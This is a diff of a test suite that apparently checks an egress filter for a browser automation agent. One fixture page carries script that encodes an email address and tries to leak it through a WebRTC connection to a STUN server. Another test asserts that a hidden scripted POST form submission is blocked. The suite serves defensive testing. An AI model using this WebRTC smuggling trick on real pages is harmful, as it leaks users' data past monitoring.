@@ -88,7 +88,7 @@ em.addEventListener('input', () => {
   '/download.html': `<!doctype html><title>Files</title><a href="/files/report.bin">Get the file</a>`,
   '/rtc.html': `<!doctype html><title>Deals</title><h1>Deals</h1><script>
 (async () => {
-  if (typeof RTCPeerConnection !== 'function') { fetch('/sink/rtc-missing', { method: 'POST', body: 'no RTCPeerConnection' }); }
+  if (typeof RTCPeerConnection !== 'function') { fetch('/sink/rtc-missing?no-RTCPeerConnection'); }
   const secret = btoa('${EMAIL}').replace(/=/g,'').replace(/\\+/g,'A').replace(/\\//g,'B');
   const pc1 = new RTCPeerConnection({ iceServers: [{ urls: 'stun:LANIP:UDPPORT' }] });
   pc1.createDataChannel('x'); await pc1.setLocalDescription(await pc1.createOffer());
@@ -255,7 +255,7 @@ test('HIGH-2: a JS form.submit() the snapshot cannot see is still held by the we
   await waitDone(a.ui);
   expect(a.audit().find((e) => e.type === 'policy' && e.action === 'click')?.decision).toBe('allow'); // heuristics miss it...
   const wr = a.audit().filter((e) => e.type === 'egress' && e.layer === 'webrequest');
-  expect(wr.some((e) => e.decision === 'block' && /unconfirmed POST form submission/.test(e.reason))).toBe(true); // ...the network layer does not
+  expect(wr.some((e) => e.decision === 'block' && /unconfirmed POST mainFrame/.test(e.reason))).toBe(true); // ...the network layer does not
   expect(sink).toEqual([]);
 
   // with a scripted approval of the egress confirmation it goes through
